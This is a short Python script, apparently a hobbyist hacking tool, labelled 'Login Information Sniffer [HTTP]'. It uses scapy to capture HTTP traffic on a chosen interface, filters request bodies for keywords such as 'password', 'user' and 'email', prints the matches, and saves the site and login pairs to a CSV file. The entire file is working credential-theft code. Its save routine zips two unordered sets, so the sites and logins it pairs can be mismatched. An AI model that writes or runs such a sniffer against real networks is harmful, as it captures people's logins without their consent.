#!/usr/bin/env python3
import setup
import scapy.all as scapy
import subprocess
from scapy.layers import http
import csv
import atexit


def greet():
    subprocess.call(["clear"])
    print("Login Information Sniffer [HTTP] 0.02 by Ravehorn\n")


def ifconfig():
    print("Running ifconfig:\n")
    subprocess.call(["ifconfig"])
    interface = input("Interface -> ")
    return interface


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def process_packet(packet):
    try:
        if packet.haslayer(http.HTTPRequest):
            if packet.haslayer(scapy.Raw):
                login = packet[scapy.Raw].load.decode("utf-8")
                site = packet[http.HTTPRequest].Host.decode("utf-8")
                if "usr" in login or "user" in login or "pwd" in login or "password" in login\
                        or "login" in login or "username" in login or "email" in login\
                        or "e-mail" in login or "pass" in login:
                    sites.append(site)
                    logins.append(login)
                    print(site)
                    print(login)
    except UnicodeDecodeError:
        pass


@atexit.register
def save():
    with open("info.csv", "a") as csv_file:
        my_fields = ["site", "login"]
        writer = csv.DictWriter(csv_file, fieldnames=my_fields)
        for site, login in zip(set(sites), set(logins)):
            writer.writerow({"site": site, 'login': login})
    print("\nSaved data and finished execution.")


sites = []
logins = []
greet()
sniff(ifconfig())
